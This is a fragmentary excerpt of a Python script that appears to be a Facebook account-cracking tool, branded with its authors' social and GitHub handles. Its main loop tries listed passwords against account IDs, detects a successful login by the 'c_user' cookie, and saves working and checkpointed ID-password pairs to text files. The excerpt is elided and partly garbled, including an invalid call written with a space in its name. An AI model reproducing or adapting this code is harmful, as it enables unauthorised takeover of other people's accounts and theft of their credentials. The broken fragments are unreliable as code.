...
→   Facebook   :  RIAZ KHAN With Mahummad Hãîdèr

→   Github     :  RIAZ-143 & Haider Official

→   Tool Type  :  \x1b[1;95mOPEN SURCE

\x1b[1;97m→   Version    :  13.9
...
def riaz():
	...
	if riaz1 =='3':
		...
		os.system('xdg-open https://github.com/HaiderOfficial/dump')

	if riaz1 =='4':

		os.system('xdg-open https://www.facebook.com/profile.php?id=100068475922048');Mahummad Hãîdèr()
...
def m2():
    ...
    print('Press Enter to Back');Mahummad Hãîdèr()
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32m[HÃÎÇK3R-OK] '+cid+'|'+ps+'\033[0;97m')

                open('HÃÎÇK3R-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                ...
                print('\033[1;31m[HÃÎÇK3R-CP] '+cid+' | '+ps+'\x1b[1;97m')

                open('HÃÎÇK3R-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r[\033[1;97mMR.HÃÎÇK3R\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
